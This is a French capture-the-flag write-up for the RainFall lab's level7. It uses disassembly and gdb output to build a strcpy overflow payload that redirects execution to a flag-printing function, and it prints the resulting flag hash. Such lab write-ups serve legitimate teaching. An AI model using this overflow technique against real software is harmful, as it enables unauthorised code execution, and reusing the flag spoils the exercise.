Nous remarquons une fonction `m` qui affiche notre flag.

```bash
080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret  
```
L'on remarque qu'à partir de 20 characters, on peux écrire dans eax soit le premier argument du deuxième strcpy.

```bash
(gdb) r "abcdefghijklnmopqrstuvwxyz" "b"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 "abcdefghijklnmopqrstuvwxyz" "b"

Breakpoint 1, 0x080485bd in main ()
(gdb) info r
eax            0x78777675	2021095029
...
(gdb) p (char*)0xbffff902
$1 = 0xbffff902 "b"

```

Nous cherchons l'adresse de retour mise dans la stack. Soit à +4 de l'adresse ebp sauvegardée.

```bash
(gdb) b main
Breakpoint 1 at 0x8048524
(gdb) r
Starting program: /home/user/level7/level7 

Breakpoint 1, 0x08048524 in main ()
(gdb) info r
...
ebp            0xbffff728	0xbffff728
```

Ensuite, il nous suffit de mettre en second argument l'adresse de `m`

```bash
level6@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x2c\xf7\xff\xbf"') $(python -c 'print "\xf4\x84\x04\x08"')
~~
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1652894726
Segmentation fault (core dumped)

```
